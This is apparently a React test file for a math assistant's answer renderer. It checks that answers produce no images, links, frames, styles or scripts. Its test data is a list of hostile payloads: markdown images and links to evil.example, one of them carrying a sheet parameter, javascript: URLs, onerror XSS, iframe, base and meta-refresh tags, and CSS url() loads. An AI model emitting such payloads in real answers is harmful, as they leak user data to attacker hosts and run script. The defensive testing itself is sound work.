import { act, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { en } from '../text/en.ts'
import { AnswerText } from './AnswerText.tsx'

/**
 * An answer as drawn (docs/spec-v1.md section 8, Math assistant, An answer; section 2,
 * Invariants: nothing in an answer makes a request; section 14, 0.7.0: the reader never makes
 * an image, a link, a frame or a style from any answer).
 */
const reference = (label: string) => <span data-ref={label}>[{label}]</span>
const draw = (text: string, arriving = false) => render(<AnswerText text={text} arriving={arriving} reference={reference} />)

/** Every element and attribute an answer could use to load, open, frame or style something. */
const MADE = 'img, picture, source, video, audio, track, a, area, iframe, frame, frameset, object, embed, applet, style, link, script, svg, math, base, meta, form, input, button:not(.assistant-code__copy), template, slot'
const ATTRIBUTES = /^(src|srcset|srcdoc|href|xlink:href|style|action|formaction|poster|background|data|ping|on.*)$/i

const hostile = [
  // Markdown's own.
  '![chart](https://evil.example/pixel.png?sheet=1)',
  '![](//evil.example/x.png)',
  '[click me](https://evil.example/steal)',
  '[ref][1]\n\n[1]: https://evil.example/ref',
  '<https://evil.example/auto>',
  'https://evil.example/bare www.evil.example evil@example.com',
  '[E2:3](https://evil.example/chip)',
  '**[bold link](javascript:alert(1))**',
  '`<img src=x onerror=alert(1)>`',
  '```html\n<img src="https://evil.example/in-code.png">\n<script>alert(1)</script>\n```',
  // Raw HTML, inline and as blocks.
  '<img src="https://evil.example/raw.png" onerror="alert(1)">',
  '<a href="https://evil.example">raw link</a>',
  '<iframe src="https://evil.example/frame"></iframe>',
  '<frameset><frame src="https://evil.example/f"></frameset>',
  '<object data="https://evil.example/o"></object><embed src="https://evil.example/e">',
  '<style>body { background: url(https://evil.example/bg.png) }</style>',
  '<div style="background:url(https://evil.example/s.png)">styled</div>',
  '<script src="https://evil.example/s.js"></script>',
  '<link rel="stylesheet" href="https://evil.example/s.css">',
  '<svg><image href="https://evil.example/svg.png"/></svg>',
  '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>',
  '<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<form action="https://evil.example"><input type="image" src="https://evil.example/i.png"></form>',
  // Formulas, which are never typeset.
  '$$\\int_0^1 x\\,dx$$ and $\\frac{a}{b}$ and \\(x^2\\)',
  // Mixed into lists and bold, and cut while arriving.
  '- ![a](https://evil.example/1.png)\n- <img src=https://evil.example/2.png>\n1. [b](https://evil.example/3)',
]

describe('AnswerText, over hostile answers', () => {
  for (const answer of hostile) {
    it(`makes no image, link, frame or style from ${JSON.stringify(answer).slice(0, 60)}`, () => {
      for (const arriving of [false, true]) {
        const { container, unmount } = draw(answer, arriving)
        expect(container.querySelectorAll(MADE)).toHaveLength(0)
        for (const element of container.querySelectorAll('*')) {
          const named = [...element.attributes].map(({ name }) => name).filter((name) => ATTRIBUTES.test(name))
          expect(named, element.outerHTML).toEqual([])
        }
        unmount()
      }
    })
  }

  it('shows raw HTML and a formula as the text the model wrote', () => {
    const { container } = draw('<img src="x.png"> and $\\frac{a}{b}$')
    expect(container.textContent).toBe('<img src="x.png"> and $\\frac{a}{b}$')
    expect(container.querySelector('.katex')).toBeNull()
  })

  it('shows a link as its text and nothing to click', () => {
    const { container } = draw('See [the Math guide](https://evil.example).')
    expect(container.textContent).toBe('See the Math guide.')
  })
})

describe('AnswerText, what it draws', () => {
  afterEach(() => vi.restoreAllMocks())

  it('draws paragraphs, lists, bold, inline code and references in the chat’s own elements', () => {
    const { container } = draw('**Units**: `v = Q / A` at [E1:2].\n\n- one\n- two\n\n3. three')
    expect(container.querySelector('strong')?.textContent).toBe('Units')
    expect(container.querySelector('code.assistant-answer__code')?.textContent).toBe('v = Q / A')
    expect(container.querySelector('[data-ref="E1:2"]')).not.toBeNull()
    expect(container.querySelectorAll('ul li')).toHaveLength(2)
    expect(container.querySelector('ol')?.getAttribute('start')).toBe('3')
  })

  it('shows a heading and a table as plain text', () => {
    const { container } = draw('## Findings\n\n| a | b |\n|---|---|')
    expect(container.querySelector('h1, h2, h3, h4, h5, h6, table')).toBeNull()
    expect(container.textContent).toContain('## Findings')
    expect(container.textContent).toContain('| a | b |')
  })

  it('marks a code block "not run by the app", with a Copy on each line that has text', async () => {
    const writeText = vi.fn(() => Promise.resolve())
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    draw('```\nA = pi * D^2 / 4\n\nv = Q / A\n```')
    const block = screen.getByTestId('assistant-code')
    expect(block.textContent).toContain(en.assistant.notRun)
    const copies = screen.getAllByRole('button', { name: en.assistant.copy })
    expect(copies).toHaveLength(2)
    // A Copy never takes the keyboard, so a line open on the sheet stays open.
    expect(copies[0].tabIndex).toBe(-1)
    expect(fireEvent.mouseDown(copies[0])).toBe(false)
    await act(async () => {
      fireEvent.click(copies[1])
    })
    expect(writeText).toHaveBeenCalledWith('v = Q / A')
    expect(screen.getByRole('button', { name: en.assistant.copied })).toBeTruthy()
    vi.unstubAllGlobals()
  })
})
